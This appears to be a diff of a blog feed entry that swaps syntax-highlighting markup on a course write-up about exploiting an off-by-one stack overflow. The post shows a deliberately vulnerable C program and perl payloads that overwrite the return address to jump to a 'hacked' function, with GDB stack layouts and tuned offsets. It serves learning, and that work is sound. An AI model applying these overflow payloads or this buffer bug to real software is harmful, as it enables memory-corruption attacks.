@@ -6,32 +6,68 @@
 &lt;h1 id="off-by-one-overflow-attack-analysis">Off-by-One Overflow Attack Analysis
 &lt;/h1>&lt;h2 id="background">Background
 &lt;/h2>&lt;p>Last week, I attended a security course that included an example of an off-by-one overflow vulnerability. Here is the original code:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* Simple off-by-one overflow example */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">1024&lt;/span>];
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strncpy&lt;/span>(buf, input, &lt;span style="color:#66d9ef">sizeof&lt;/span>(buf));
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf[&lt;span style="color:#66d9ef">sizeof&lt;/span>(buf)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">bar&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;I&amp;#39;ve been hacked&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (argc &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Usage: %s input_string&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, argv[&lt;span style="color:#ae81ff">0&lt;/span>]);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exit&lt;/span>(EXIT_FAILURE);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">foo&lt;/span>(argv[&lt;span style="color:#ae81ff">1&lt;/span>]);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The answer provided for exploiting this vulnerability is:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>perl -e &lt;span style="color:#e6db74">&amp;#39;system &amp;#34;./obo&amp;#34;, &amp;#34;\x38\x84\x04\x08&amp;#34;x256&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The result of running this command is that multiple lines of &lt;code>I've been hacked&lt;/code> are printed on the screen.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* Simple off-by-one overflow example */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">foo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strncpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">bar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;I&amp;#39;ve been hacked&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Usage: %s input_string&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">foo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The answer provided for exploiting this vulnerability is:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">perl -e &lt;span class="s1">&amp;#39;system &amp;#34;./obo&amp;#34;, &amp;#34;\x38\x84\x04\x08&amp;#34;x256&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The result of running this command is that multiple lines of &lt;code>I've been hacked&lt;/code> are printed on the screen.&lt;/p>
 &lt;h2 id="analysis">Analysis
 &lt;/h2>&lt;p>When the program enters the &lt;code>foo&lt;/code> function, the memory layout looks like this (as observed using GDB):&lt;/p>
 &lt;p>From top to bottom, the layout contains the return address, the saved frame pointer, and the buffer (&lt;code>buf&lt;/code>).&lt;/p>
@@ -40,17 +76,32 @@
 &lt;/h2>&lt;p>When the &lt;code>foo&lt;/code> function returns, it typically executes the following key assembly instructions:&lt;/p>
 &lt;h3 id="1-leave-instruction">1. &lt;code>leave&lt;/code> Instruction
 &lt;/h3>&lt;p>The &lt;code>leave&lt;/code> instruction is equivalent to:&lt;/p>
-&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">mov esp, ebp
-pop ebp
-&lt;/code>&lt;/pre>&lt;ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mov esp, ebp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pop ebp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
 &lt;li>&lt;code>mov esp, ebp&lt;/code>: This sets the stack pointer (&lt;code>esp&lt;/code>) to the value of the frame pointer (&lt;code>ebp&lt;/code>), restoring the stack pointer to the top of the current stack frame and effectively releasing the space occupied by the current function.&lt;/li>
 &lt;li>&lt;code>pop ebp&lt;/code>: This pops the value at the top of the stack and assigns it to the frame pointer (&lt;code>ebp&lt;/code>), thereby restoring the caller&amp;rsquo;s frame pointer. Essentially, it writes the return address into &lt;code>ebp&lt;/code>, meaning it assigns the stack value (usually the caller&amp;rsquo;s frame address) to &lt;code>ebp&lt;/code>, restoring the caller&amp;rsquo;s stack frame.&lt;/li>
 &lt;/ul>
 &lt;p>The effect of &lt;code>leave&lt;/code> is to restore &lt;code>esp&lt;/code> to its state before the function was called and to pop the saved &lt;code>ebp&lt;/code>. If &lt;code>ebp&lt;/code> has been overwritten to point to a special address (such as an address within the buffer), it can result in an incorrect stack pointer location during function return.&lt;/p>
 &lt;h3 id="2-ret-instruction">2. &lt;code>ret&lt;/code> Instruction
 &lt;/h3>&lt;p>The &lt;code>ret&lt;/code> instruction pops an address off the top of the stack and jumps to that address:&lt;/p>
-&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">pop eip
-&lt;/code>&lt;/pre>&lt;p>If the return address has been overwritten with the address of the &lt;code>bar&lt;/code> function, the execution flow will jump to &lt;code>bar&lt;/code>, allowing an attacker to run arbitrary code. Essentially, &lt;code>ret&lt;/code> pops an address into the instruction pointer (&lt;code>eip&lt;/code>) and jumps to that address to continue execution.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">pop eip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If the return address has been overwritten with the address of the &lt;code>bar&lt;/code> function, the execution flow will jump to &lt;code>bar&lt;/code>, allowing an attacker to run arbitrary code. Essentially, &lt;code>ret&lt;/code> pops an address into the instruction pointer (&lt;code>eip&lt;/code>) and jumps to that address to continue execution.&lt;/p>
 &lt;h2 id="attack-steps">Attack Steps
 &lt;/h2>&lt;ul>
 &lt;li>When the command &lt;code>perl -e 'system &amp;quot;./obo&amp;quot;, &amp;quot;\x38\x84\x04\x08&amp;quot;x256'&lt;/code> is executed, the program takes these repeated bytes as the input to &lt;code>./obo&lt;/code>.&lt;/li>
@@ -59,17 +110,33 @@ pop ebp
 &lt;h2 id="further-analysis-determining-effective-overwrite-locations">Further Analysis: Determining Effective Overwrite Locations
 &lt;/h2>&lt;h2 id="stack-frame-layout-explanation">Stack Frame Layout Explanation
 &lt;/h2>&lt;p>During the GDB debugging session, the memory layout for the stack frame of the &lt;code>foo&lt;/code> function looks like this:&lt;/p>
-&lt;pre tabindex="0">&lt;code>0xbfffed10 return address
-0xbfffed0c saved frame pointer (ebp)
-0xbfffed0b buf[1023]
-...
-0xbfffed03 buf[1015]
-0xbfffed02 buf[1014]
-0xbfffed01 buf[1013]
-0xbfffed00 buf[1012]
-...
-0xbfffe90c buf[0]
-&lt;/code>&lt;/pre>&lt;ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">0xbfffed10 return address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffed0c saved frame pointer (ebp)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffed0b buf[1023]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffed03 buf[1015]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffed02 buf[1014]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffed01 buf[1013]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffed00 buf[1012]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbfffe90c buf[0]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
 &lt;li>
 &lt;p>&lt;strong>Return address&lt;/strong>: Located at &lt;code>0xbfffed10&lt;/code>, this is the address that the program will jump to after the &lt;code>foo&lt;/code> function finishes executing. Overwriting this address can control the flow of the program and potentially redirect it to malicious code (e.g., the &lt;code>bar&lt;/code> function).&lt;/p>
 &lt;/li>
@@ -99,8 +166,15 @@ pop ebp
 &lt;/li>
 &lt;li>
 &lt;p>The corresponding offset is at position 255 in &lt;code>buf&lt;/code>, meaning the attack can be constructed by filling in the return address only at that specific location. The following command was used for verification in GDB:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#66d9ef">$(&lt;/span>perl -e &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x254 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x1&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">r &lt;span class="k">$(&lt;/span>perl -e &lt;span class="s1">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x254 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x1&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
 &lt;li>
 &lt;p>This was verified to work under GDB debugging, with some details to note:&lt;/p>
 &lt;ol>
@@ -110,7 +184,14 @@ pop ebp
 &lt;/li>
 &lt;li>
 &lt;p>When executing the program directly (i.e., without GDB), the memory layout differs, resulting in a different offset position. Through experimentation, it was found that the offset is at position 235. The corresponding attack command is:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./obo &lt;span style="color:#66d9ef">$(&lt;/span>perl -e &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x234 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x21&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./obo &lt;span class="k">$(&lt;/span>perl -e &lt;span class="s1">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x234 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x21&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
 &lt;/ul>
 &lt;p>This achieves the desired effect of accurately finding the overwrite location and successfully executing the attack.&lt;/p></description></item></channel></rss>
